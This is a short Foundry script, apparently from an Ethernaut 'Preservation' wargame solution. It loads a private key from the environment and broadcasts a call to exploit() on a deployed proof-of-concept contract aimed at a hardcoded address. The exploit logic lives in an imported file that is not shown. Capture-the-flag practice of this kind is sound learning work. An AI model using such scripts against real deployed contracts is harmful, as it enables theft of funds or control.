pragma solidity ^0.8.24;

import {Script} from "forge-std/Script.sol";
import "Ethernaut/preservation_poc.sol";

contract PreservationPocScript is Script 
{
  function run() public 
  {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(deployerPrivateKey);

    PreservationPoc preservationPoc = PreservationPoc(0xCE8C3fA1a966ddf56e978F35c1ae4c18aE5C5Dd1);
    preservationPoc.exploit(0x63c34506f4f6280D42E7533Ae1d1d657ca4C6c3B);

    vm.stopBroadcast();
  }
}